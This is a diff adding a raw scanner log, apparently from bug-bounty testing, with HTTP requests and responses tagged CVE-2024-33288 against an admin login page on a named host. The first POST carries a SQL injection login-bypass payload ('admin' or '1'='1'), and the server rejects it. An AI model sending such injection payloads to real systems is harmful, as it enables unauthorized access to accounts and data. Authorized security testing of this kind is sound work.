@@ -1,0 +1,53 @@
+[CVE-2024-33288] Dumped HTTP request for https://techsolutions.bitpanda.com/Admin/login.php
+
+
+POST /Admin/login.php HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15
+Connection: close
+Content-Length: 89
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+txtusername=admin%27+or+%271%27+%3D%271&txtpassword=30rudfChHhqEl6mWmimokZSTVS8&btnlogin=
+[CVE-2024-33288] Dumped HTTP response https://techsolutions.bitpanda.com/Admin/login.php
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:22 GMT
+Via: 1.1 f28664317eb9628b30397afa3d6b821c.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: CToQ_oJOn4h8XccX9-xwLd8pA8cNfzWTA4aQAnhkiO3i197D68aVSQ==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
+[CVE-2024-33288] Dumped HTTP request for https://techsolutions.bitpanda.com/Admin/index.php
+
+
+GET /Admin/index.php HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+Connection: close
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2024-33288] Dumped HTTP response https://techsolutions.bitpanda.com/Admin/index.php
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 9
+Cache-Control: max-age=30
+Content-Type: text/plain
+Date: Tue, 05 Aug 2025 12:53:23 GMT
+Strict-Transport-Security: max-age=31536000
+Via: 1.1 232d9e401eb3600ef80d948c2dc546b8.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: 92fkSAh5JWAl6ghQRh7DeYks0HiqIhkhXZfT7PysS1sKoxQECIj8XQ==
+X-Amz-Cf-Pop: IAD55-P8
+X-Amz-Id-2: 7ztWWpWCyLjCkCZ+c0IQu71spJ76e5UyB5bdNDearWB/3WRpyxLk6+SndoJq95O2NW+SxbkLuFY=
+X-Amz-Request-Id: 41ZDF796A4A6HTEY
+X-Cache: Error from cloudfront
+
+Not Found
